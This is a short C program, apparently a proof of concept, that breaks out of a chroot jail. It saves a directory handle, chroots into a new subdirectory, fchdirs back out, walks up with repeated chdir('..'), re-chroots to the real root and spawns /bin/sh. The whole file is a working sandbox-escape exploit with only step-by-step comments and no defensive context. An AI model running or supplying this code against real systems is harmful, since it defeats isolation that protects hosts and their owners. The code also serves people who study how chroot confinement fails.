 #include <stdio.h>
 #include <errno.h>
 #include <fcntl.h>
 #include <string.h>
 #include <unistd.h>
 #include <sys/stat.h>
 #include <sys/types.h>
 
 int main(){
 
 	int x; /* Used to move up a directory tree */
 	int dir_fd; /* File descriptor ot directory */
 	
 	/* 1. Create some temporary directory */
 	mkdir("chroot-breakout-dir", 0755);

 	/* 2. Open the directory and save the handle */
 	dir_fd = open(".", O_RDONLY);

 	/* 3. Call the chroot operation on temporary directory,
 	changing the root to this directory*/
 	chroot("chroot-breakout-dir");

	/* 4. Call fchdir over the temporary directory handle */
 	fchdir(dir_fd);
 	close(dir_fd);
 	
 	
 	/* 5. Call chdir("..") a few times to get the real root */
 	for(x=0; x<1024; x++){
 		chdir("..");
 	}
 	
 	/* 6. Change the root of the program to the real root (using chroot) */
 	chroot(".");
 	system("/bin/sh");
 }